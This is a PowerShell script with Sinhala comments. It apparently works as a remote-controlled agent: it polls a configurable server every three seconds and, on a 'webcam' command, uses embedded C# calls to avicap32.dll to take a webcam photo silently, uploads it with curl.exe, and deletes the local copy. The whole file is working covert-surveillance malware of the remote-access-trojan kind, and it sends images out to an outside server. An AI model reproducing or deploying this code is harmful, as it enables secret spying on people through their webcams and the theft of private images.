$ServerURL = "http://localhost:3880" # ඔයාගේ සර්වර් එක රන් වෙන ලින්ක් එක දාන්න
$AgentID = "PC-01"

# කැමරාවෙන් පින්තූරයක් ගන්නා Function එක
Function Capture-Webcam {
    $tempFile = "$env:TEMP\webcam_capture.jpg"
    
    $code = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Drawing;
    using System.Drawing.Imaging;

    public class WebCamCapture {
        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
        public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWnd, int nID);
        
        [DllImport("user32.dll")]
        public static extern bool SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        
        [DllImport("user32.dll")]
        public static extern bool DestroyWindow(IntPtr hWnd);

        public static bool Capture(string filePath) {
            IntPtr hWnd = capCreateCaptureWindowA("Webcam", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
            if (hWnd == IntPtr.Zero) return false;

            SendMessage(hWnd, 0x0400 + 10, 0, 0); // WM_CAP_DRIVER_CONNECT
            SendMessage(hWnd, 0x0400 + 50, 1, 0); // WM_CAP_SET_PREVIEW
            SendMessage(hWnd, 0x0400 + 52, 30, 0); // WM_CAP_SET_PREVIEWRATE
            System.Threading.Thread.Sleep(1000); // කැමරාව ඔන් වෙන්න ටිකක් ඉන්නවා

            SendMessage(hWnd, 0x0400 + 60, 0, 0); // WM_CAP_GRAB_FRAME
            System.Threading.Thread.Sleep(500);
            
            // පින්තූරය Clipboard එකට ගන්නවා
            SendMessage(hWnd, 0x0400 + 41, 0, 0); // WM_CAP_EDIT_COPY
            
            try {
                Image img = System.Windows.Forms.Clipboard.GetImage();
                if (img != null) {
                    img.Save(filePath, ImageFormat.Jpeg);
                }
            } catch { return false; }

            SendMessage(hWnd, 0x0400 + 11, 0, 0); // WM_CAP_DRIVER_DISCONNECT
            DestroyWindow(hWnd);
            return true;
        }
    }
"@

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing, System.Windows.Forms

    $result = [WebCamCapture]::Capture($tempFile)
    if ($result -and (Test-Path $tempFile)) {
        return $tempFile
    } else {
        return $null
    }
}

Write-Host "Agent Started. Waiting for commands..."

while ($true) {
    try {
        # සර්වර් එකෙන් කමාන්ඩ් එකක් තියෙනවද බලනවා
        $response = Invoke-RestMethod -Uri "$ServerURL/api/poll" -Method Get -TimeoutSec 10
        
        if ($response.command -eq "webcam") {
            Write-Host "Webcam command received! Capturing..."
            $imgPath = Capture-Webcam
            
            if ($imgPath) {
                Write-Host "Image captured. Uploading..."
                # curl.exe පාවිච්චි කරලා සර්වර් එකට ෆොටෝ එක යවනවා
                $uploadResult = curl.exe -s -X POST -F "webcamPhoto=@$imgPath" "$ServerURL/api/upload-webcam"
                Write-Host "Upload complete: $uploadResult"
                Remove-Item $imgPath -Force
            } else {
                Write-Host "Failed to capture image. Check webcam connection."
            }
        }
    } catch {
        Write-Host "Error connecting to server: $_"
    }
    Start-Sleep -Seconds 3 # හැම තත්පර 3කට වරක් චෙක් කරනවා
}
